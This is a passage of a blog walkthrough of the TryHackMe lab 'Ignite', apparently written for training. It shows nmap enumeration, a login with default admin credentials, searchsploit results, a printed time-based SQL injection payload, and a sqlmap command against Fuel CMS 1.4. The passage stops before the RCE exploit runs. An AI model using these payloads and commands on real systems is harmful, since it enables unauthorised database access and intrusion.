<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Ignite - TryHackMe Walkthrough :: Umar_0x01 – Pentester | Programmer | Your average sakurity guy ( ͡~ ͜ʖ ͡°)</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Host: 10.10.140.200
 Enumeration As always, let&amp;rsquo;s start with a quick NMAP (-A) scan against the host
┌──(root💀b0x)-[/mnt/hgfs/THM/Ignite] └─# nmap -A 10.10.140.200 -Pn -n Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 11:31 PKT Nmap scan report for 10.10.140.200 Host is up (0.19s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open ssl/http Apache/2."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://umar0x01.sh/post/ignite-thm/" />





<link rel="stylesheet" href="https://umar0x01.sh/assets/style.css">

<link rel="stylesheet" href="https://umar0x01.sh/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://umar0x01.sh/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://umar0x01.sh/img/favicon.png">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Ignite - TryHackMe Walkthrough"/>
<meta name="twitter:description" content="Walkthrough of the machine Ignite on TryHackMe - https://tryhackme.com/room/ignite"/>



<meta property="og:title" content="Ignite - TryHackMe Walkthrough" />
<meta property="og:description" content="Walkthrough of the machine Ignite on TryHackMe - https://tryhackme.com/room/ignite" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://umar0x01.sh/post/ignite-thm/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-04-09T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-09T00:00:00&#43;00:00" />








<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">




  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/anime">Anime</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
        
          <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/anime">Anime</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="https://pentestlabs.gitbook.io">PentestLabs</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="https://umar0x01.sh/post/ignite-thm/">Ignite - TryHackMe Walkthrough</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-04-09
        </span>

        
          
        
      

      <span class="post-author">— Written by Umar_0x01</span>
      
    </div>

    

    
      <figure class="post-cover">
        
          <img src="https://umar0x01.sh/img/ignite-thm/ignite.png" alt="Ignite - TryHackMe Walkthrough" />
        

        
      </figure>
    

    <div class="post-content">
      
      <hr>
<p><strong>Host:</strong> 10.10.140.200</p>
<hr>
<h2 id="enumeration">Enumeration</h2>
<p>As always, let&rsquo;s start with a quick NMAP (-A) scan against the host</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> nmap -A <span style="color:#ae81ff">10.10</span>.<span style="color:#ae81ff">140.200</span> -Pn -n
Host discovery disabled (-Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-04-09 11:31 PKT
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10</span>.<span style="color:#ae81ff">140.200</span>
Host <span style="color:#66d9ef">is</span> up (<span style="color:#ae81ff">0.19</span>s latency).
Not shown: <span style="color:#ae81ff">999</span> closed ports
PORT   STATE SERVICE  VERSION
<span style="color:#ae81ff">80</span>/tcp open  ssl/http Apache/<span style="color:#ae81ff">2.4</span>.<span style="color:#ae81ff">18</span> (Ubuntu)
| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
|_/fuel/
|_http-server-header: Apache/<span style="color:#ae81ff">2.4</span>.<span style="color:#ae81ff">18</span> (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches <span style="color:#66d9ef">for</span> host (If you know what OS <span style="color:#66d9ef">is</span> running <span style="color:#66d9ef">on</span> it, see https:<span style="color:#75715e">//nmap.org/submit/ ).
</span><span style="color:#75715e"></span>TCP/IP fingerprint:
OS:SCAN(V=<span style="color:#ae81ff">7.91</span>%E=<span style="color:#ae81ff">4</span>%D=<span style="color:#ae81ff">4</span>/<span style="color:#ae81ff">9</span>%OT=<span style="color:#ae81ff">80</span>%CT=<span style="color:#ae81ff">1</span>%CU=<span style="color:#ae81ff">44104</span>%PV=Y%DS=<span style="color:#ae81ff">5</span>%DC=T%G=Y%TM=<span style="color:#ae81ff">606F</span>F4F1
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=<span style="color:#ae81ff">108</span>%GCD=<span style="color:#ae81ff">1</span>%ISR=<span style="color:#ae81ff">10</span>E%TI=Z%II=I%TS=A)SEQ(SP=<span style="color:#ae81ff">10</span>
OS:<span style="color:#ae81ff">8</span>%GCD=<span style="color:#ae81ff">1</span>%ISR=<span style="color:#ae81ff">10</span>E%TI=Z%CI=I%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O3
OS:=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=<span style="color:#ae81ff">68D</span>F%W2=<span style="color:#ae81ff">6</span>
OS:<span style="color:#ae81ff">8D</span>F%W3=<span style="color:#ae81ff">68D</span>F%W4=<span style="color:#ae81ff">68D</span>F%W5=<span style="color:#ae81ff">68D</span>F%W6=<span style="color:#ae81ff">68D</span>F)ECN(R=Y%DF=Y%T=<span style="color:#ae81ff">40</span>%W=<span style="color:#ae81ff">6903</span>%O=M506NNSNW
OS:<span style="color:#ae81ff">6</span>%CC=Y%Q=)T1(R=Y%DF=Y%T=<span style="color:#ae81ff">40</span>%S=O%A=S+%F=AS%RD=<span style="color:#ae81ff">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=<span style="color:#ae81ff">40</span>%W=<span style="color:#ae81ff">0</span>%S=A%A=Z%F=R%O=%RD=<span style="color:#ae81ff">0</span>%Q=)T5(R=Y%DF=Y%T=<span style="color:#ae81ff">40</span>%W=<span style="color:#ae81ff">0</span>%S=Z%A=S+%F=AR%O=
OS:%RD=<span style="color:#ae81ff">0</span>%Q=)T6(R=Y%DF=Y%T=<span style="color:#ae81ff">40</span>%W=<span style="color:#ae81ff">0</span>%S=A%A=Z%F=R%O=%RD=<span style="color:#ae81ff">0</span>%Q=)T7(R=Y%DF=Y%T=<span style="color:#ae81ff">40</span>%W=
OS:<span style="color:#ae81ff">0</span>%S=Z%A=S+%F=AR%O=%RD=<span style="color:#ae81ff">0</span>%Q=)U1(R=Y%DF=N%T=<span style="color:#ae81ff">40</span>%IPL=<span style="color:#ae81ff">164</span>%UN=<span style="color:#ae81ff">0</span>%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=<span style="color:#ae81ff">40</span>%CD=S)

Network Distance: <span style="color:#ae81ff">5</span> hops

TRACEROUTE (<span style="color:#66d9ef">using</span> port <span style="color:#ae81ff">3389</span>/tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">61.96</span> ms  <span style="color:#ae81ff">10.17</span>.<span style="color:#ae81ff">0.1</span>
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">4</span>
<span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">182.37</span> ms <span style="color:#ae81ff">10.10</span>.<span style="color:#ae81ff">140.200</span>

OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">52.01</span> seconds
</code></pre></div><p>Only, port 80 (HTTP) open. Let&rsquo;s enumerate this port and the web server.</p>
<h3 id="http---port-80">HTTP - (Port 80)</h3>
<p>We can see that the web server is hosting Fuel CMS by visiting the port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">http:<span style="color:#75715e">//10.10.140.200/
</span></code></pre></div><p><img src="/img/ignite-thm/Untitled.png" alt=""></p>
<p>We can see the version installed (1.4) — Also, if we just scrolldown a little bit, we can see that the <strong>getting started</strong> page contains <strong>credentials</strong> in it.</p>
<p><img src="/img/ignite-thm/Untitled%201.png" alt=""></p>
<p>The path <code>/fuel/</code> can also be obtained from <code>/robots.txt</code> which NMAP indicated in the scan.</p>
<p><img src="/img/ignite-thm/Untitled%202.png" alt=""></p>
<p>Cool, we got the login page, let&rsquo;s try the credentials:</p>
<p><strong>Username:</strong> <code>admin</code></p>
<p><strong>Password:</strong> <code>admin</code></p>
<p><img src="/img/ignite-thm/Untitled%203.png" alt=""></p>
<p>We&rsquo;re logged in! Let&rsquo;s see if there are any version specific vulnerabilities of <strong>Fuel CMS</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> searchsploit fuel cms
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">1</span> - Remote Code Execution (<span style="color:#ae81ff">1</span>)                                                                                                                                       | linux/webapps/<span style="color:#ae81ff">47138.</span>py
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">1</span> - Remote Code Execution (<span style="color:#ae81ff">2</span>)                                                                                                                                       | php/webapps/<span style="color:#ae81ff">49487.</span>rb
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">7</span> - <span style="color:#960050;background-color:#1e0010">&#39;</span>col<span style="color:#960050;background-color:#1e0010">&#39;</span> SQL Injection (Authenticated)                                                                                                                             | php/webapps/<span style="color:#ae81ff">48741.</span>txt
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">8</span> - <span style="color:#960050;background-color:#1e0010">&#39;</span>fuel_replace_id<span style="color:#960050;background-color:#1e0010">&#39;</span> SQL Injection (Authenticated)                                                                                                                 | php/webapps/<span style="color:#ae81ff">48778.</span>txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><p>We can see multiple exploits for the version (1.4) — Let&rsquo;s utilize the authenticated ones, since we&rsquo;ve the credentials already. <code>php/webapps/48778.txt</code> contains a request body recreating which will take time.</p>
<p>Let&rsquo;s utilize the second-last exploit (<code>php/webapps/48741.txt</code>)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> searchsploit -x php/webapps/<span style="color:#ae81ff">48741.</span>txt
  Exploit: Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">7</span> - <span style="color:#960050;background-color:#1e0010">&#39;</span>col<span style="color:#960050;background-color:#1e0010">&#39;</span> SQL Injection (Authenticated)
      URL: https:<span style="color:#75715e">//www.exploit-db.com/exploits/48741
</span><span style="color:#75715e"></span>     Path: /usr/share/exploitdb/exploits/php/webapps/<span style="color:#ae81ff">48741.</span>txt
File Type: ASCII text, with very <span style="color:#66d9ef">long</span> lines, with CRLF line terminators

<span style="color:#ae81ff">2.</span> Proof of Concept:
----------------------

In Burpsuite intercept the request <span style="color:#66d9ef">from</span> one of the affected pages with <span style="color:#960050;background-color:#1e0010">&#39;</span>col<span style="color:#960050;background-color:#1e0010">&#39;</span> parameter and save it like fuel.req
Then run SQLmap to extract the data <span style="color:#66d9ef">from</span> the database:

sqlmap -r fuel.req --risk=<span style="color:#ae81ff">3</span> --level=<span style="color:#ae81ff">5</span> --dbs --random-agent

<span style="color:#ae81ff">3.</span> Example payload:
----------------------

(time-based blind)

/fuelcms/pages/items/?search_term=&amp;published=&amp;layout=&amp;limit=<span style="color:#ae81ff">50</span>&amp;view_type=list&amp;offset=<span style="color:#ae81ff">0</span>&amp;order=asc&amp;col=location+AND+(SELECT+<span style="color:#ae81ff">1340</span>+FROM+(SELECT(SLEEP(<span style="color:#ae81ff">5</span>)))ULQV)&amp;fuel_inline=<span style="color:#ae81ff">0</span>

<span style="color:#ae81ff">4.</span> Burpsuite request:
----------------------

GET /fuelcms/pages/items/?search_term=&amp;published=&amp;layout=&amp;limit=<span style="color:#ae81ff">50</span>&amp;view_type=list&amp;offset=<span style="color:#ae81ff">0</span>&amp;order=asc&amp;col=location%<span style="color:#ae81ff">20</span>AND%<span style="color:#ae81ff">20</span>(SELECT%<span style="color:#ae81ff">201340</span>%<span style="color:#ae81ff">20F</span>ROM%<span style="color:#ae81ff">20</span>(SELECT(SLEEP(<span style="color:#ae81ff">5</span>)))ULQV)&amp;fuel_inline=<span style="color:#ae81ff">0</span> HTTP/<span style="color:#ae81ff">1.1</span>

Host: <span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span>
User-Agent: Mozilla/<span style="color:#ae81ff">5.0</span> (X11; Linux x86_64; rv:<span style="color:#ae81ff">68.0</span>) Gecko/<span style="color:#ae81ff">20100101</span> Firefox/<span style="color:#ae81ff">68.0</span>
Accept: text/html,application/xhtml+xml,application/xml;q=<span style="color:#ae81ff">0.9</span>,*/*;q=<span style="color:#ae81ff">0.8</span>
Accept-Language: en-US,en;q=<span style="color:#ae81ff">0.5</span>
Accept-Encoding: gzip, deflate
Connection: close

Cookie: ci_session=<span style="color:#ae81ff">2</span>pvc8gmus9he9fbesp3lkhlbc7oal188; fuel_eeed351bf4de904070ff77c1aef15576=a%<span style="color:#ae81ff">3</span>A2%<span style="color:#ae81ff">3</span>A%<span style="color:#ae81ff">7</span>Bs%<span style="color:#ae81ff">3</span>A2%<span style="color:#ae81ff">3</span>A%<span style="color:#ae81ff">22</span>id%<span style="color:#ae81ff">22</span>%<span style="color:#ae81ff">3</span>Bs%<span style="color:#ae81ff">3</span>A1%<span style="color:#ae81ff">3</span>A%<span style="color:#ae81ff">221</span>%<span style="color:#ae81ff">22</span>%<span style="color:#ae81ff">3</span>Bs%<span style="color:#ae81ff">3</span>A8%<span style="color:#ae81ff">3</span>A%<span style="color:#ae81ff">22l</span>anguage%<span style="color:#ae81ff">22</span>%<span style="color:#ae81ff">3</span>Bs%<span style="color:#ae81ff">3</span>A7%<span style="color:#ae81ff">3</span>A%<span style="color:#ae81ff">22</span>english%<span style="color:#ae81ff">22</span>%<span style="color:#ae81ff">3</span>B%<span style="color:#ae81ff">7D</span>; fuel_ui_eeed351bf4de904070ff77c1aef15576=%<span style="color:#ae81ff">2528</span>%<span style="color:#ae81ff">257</span>Bleftnav_h3%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">257</span>C0%<span style="color:#ae81ff">257</span>C0%<span style="color:#ae81ff">257</span>C0%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520f</span>uel_permissions_items%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">2522l</span>ist%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520f</span>uel_pages_items%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">2522l</span>ist%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520l</span>eftnav_hide%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520</span>tabs_ms_assets_create%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520</span>tabs_ms_assets_create_5a47396a63773d3d%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520</span>tabs_ms_assets_create_5a47396a637939305a584e30%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520</span>tabs_ms_assets_create_615731685a32567a%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">25220</span>%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">252</span>C%<span style="color:#ae81ff">2520f</span>uel_navigation_items%<span style="color:#ae81ff">253</span>A%<span style="color:#ae81ff">2522l</span>ist%<span style="color:#ae81ff">2522</span>%<span style="color:#ae81ff">257D</span>%<span style="color:#ae81ff">2529</span>

Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
</code></pre></div><p>Alright, we can see that this one only requires valid Cookies &amp; request URL. We can fetch the <strong>cookies</strong> from the browser and can use <code>sqlmap</code> for going on ahead.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">sqlmap <span style="color:#f92672">--</span>risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">--</span>level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">--</span>dbs <span style="color:#f92672">--</span>random<span style="color:#f92672">-</span>agent <span style="color:#f92672">--</span>batch <span style="color:#f92672">--</span>threads <span style="color:#ae81ff">10</span> <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://10.10.140.200/fuel/pages/items?search_term=a&amp;published=&amp;layout=&amp;search=Search&amp;limit=50&amp;view_type=list&amp;offset=0&amp;order=asc&amp;col=location*&amp;fuel_inline=0&#34;</span> <span style="color:#f92672">--</span>cookie <span style="color:#e6db74">&#39;ci_session=cfgcs6rgfrsqoo2hq067o0huq4ierrmn; fuel_7da515443a82fcacf15d74c766f4b34b=a%3A2%3A%7Bs%3A2%3A</span><span style="color:#e6db74">%22i</span><span style="color:#e6db74">d</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">3Bs%3A1%3A</span><span style="color:#e6db74">%221%</span><span style="color:#e6db74">22%3Bs%3A8%3A%22language</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">3Bs%3A7%3A</span><span style="color:#e6db74">%22e</span><span style="color:#e6db74">nglish</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">3B%7D; fuel_ui_7da515443a82fcacf15d74c766f4b34b=%257B</span><span style="color:#e6db74">%2522le</span><span style="color:#e6db74">ftnav_h3</span><span style="color:#e6db74">%2522%</span><span style="color:#e6db74">253A</span><span style="color:#e6db74">%25220%</span><span style="color:#e6db74">257C0%257C0%257C0</span><span style="color:#e6db74">%2522%</span><span style="color:#e6db74">252C</span><span style="color:#e6db74">%2522f</span><span style="color:#e6db74">uel_pages_items</span><span style="color:#e6db74">%2522%</span><span style="color:#e6db74">253A</span><span style="color:#e6db74">%2522li</span><span style="color:#e6db74">st</span><span style="color:#e6db74">%2522%</span><span style="color:#e6db74">257D&#39;</span>
</code></pre></div><blockquote>
<p>You can see that I added a `` after <code>col=location</code> that&rsquo;s for indicating to sqlmap to inject in that parameter.</p>
</blockquote>
<p>Since, the exploit is time-based blind, it&rsquo;ll take a lot of time for it to complete. Let&rsquo;s go through the remaining exploits (remember to try everything always!)</p>
<p>Let&rsquo;s use the second RCE exploit now:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> searchsploit fuel cms                      
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">1</span> - Remote Code Execution (<span style="color:#ae81ff">1</span>)                                                                                                                                       | linux/webapps/<span style="color:#ae81ff">47138.</span>py
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">1</span> - Remote Code Execution (<span style="color:#ae81ff">2</span>)                                                                                                                                       | php/webapps/<span style="color:#ae81ff">49487.</span>rb
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">7</span> - <span style="color:#960050;background-color:#1e0010">&#39;</span>col<span style="color:#960050;background-color:#1e0010">&#39;</span> SQL Injection (Authenticated)                                                                                                                             | php/webapps/<span style="color:#ae81ff">48741.</span>txt
Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">8</span> - <span style="color:#960050;background-color:#1e0010">&#39;</span>fuel_replace_id<span style="color:#960050;background-color:#1e0010">&#39;</span> SQL Injection (Authenticated)                                                                                                                 | php/webapps/<span style="color:#ae81ff">48778.</span>txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre></div><p>We&rsquo;ll be using <code>php/webapps/49487.rb</code>. Let&rsquo;s copy the exploit to our own directory first and convert it from dos from to unix.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> searchsploit -m php/webapps/<span style="color:#ae81ff">49487.</span>rb
  Exploit: Fuel CMS <span style="color:#ae81ff">1.4</span>.<span style="color:#ae81ff">1</span> - Remote Code Execution (<span style="color:#ae81ff">2</span>)
      URL: https:<span style="color:#75715e">//www.exploit-db.com/exploits/49487
</span><span style="color:#75715e"></span>     Path: /usr/share/exploitdb/exploits/php/webapps/<span style="color:#ae81ff">49487.</span>rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /mnt/hgfs/THM/Ignite/<span style="color:#ae81ff">49487.</span>rb

<span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> 

<span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)-[/mnt/hgfs/THM/Ignite]
<span style="color:#960050;background-color:#1e0010">└─#</span> dos2unix <span style="color:#ae81ff">49487.</span>rb 
dos2unix: converting file <span style="color:#ae81ff">49487.</span>rb to Unix format...
</code></pre></div><p>It has a dependency issue, let&rsquo;s install it with <code>gem</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-[</span><span style="color:#e6db74">/mnt/</span>hgfs<span style="color:#f92672">/</span><span style="color:#66d9ef">THM</span><span style="color:#f92672">/</span><span style="color:#66d9ef">Ignite</span><span style="color:#f92672">]</span>   
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># ruby 49487.rb                                                                                                                                                                                                  </span>
<span style="color:#66d9ef">Traceback</span> (most recent call last):
        <span style="color:#ae81ff">2</span>: from <span style="color:#ae81ff">49487</span><span style="color:#f92672">.</span>rb:<span style="color:#ae81ff">14</span><span style="color:#e6db74">:in</span> <span style="color:#e6db74">`&lt;main&gt;&#39;
</span><span style="color:#e6db74">        1: from /usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `</span>require<span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in `require&#39;</span>: cannot load such file <span style="color:#f92672">--</span> docopt (<span style="color:#66d9ef">LoadError</span>)

<span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-[</span><span style="color:#e6db74">/mnt/</span>hgfs<span style="color:#f92672">/</span><span style="color:#66d9ef">THM</span><span style="color:#f92672">/</span><span style="color:#66d9ef">Ignite</span><span style="color:#f92672">]</span>
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># </span>

<span style="color:#960050;background-color:#1e0010">┌──</span>(root<span style="color:#960050;background-color:#1e0010">💀</span>b0x)<span style="color:#f92672">-[</span><span style="color:#e6db74">/mnt/</span>hgfs<span style="color:#f92672">/</span><span style="color:#66d9ef">THM</span><span style="color:#f92672">/</span><span style="color:#66d9ef">Ignite</span><span style="color:#f92672">]</span>                                                                                                                                                                              
<span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#75715e"># gem install docopt                                                                                                                                                                                         1 ⨯ </span>
<span style="color:#66d9ef">Fetching</span> docopt<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span>gem                           
<span style="color:#66d9ef">Successfully</span> installed docopt<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>  
<span style="color:#66d9ef">Parsing</span> documentation <span style="color:#66d9ef">for</span> docopt<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>         
<span style="color:#66d9ef">Installing</span> ri documentation <span style="color:#66d9ef">for</span> docopt<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">6</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>                                                                                                                                                                       
<span style="color:#66d9ef">Done</span> installing documentation <span style="color:#66d9ef">for</span> docopt after <span style="color:#ae81ff">0</span> seconds                                                                                                                                                           
<span style="color:#ae81ff">1</span> gem installed
</code></pre></div><p>Let&rsquo;s run the exploit now:</p>
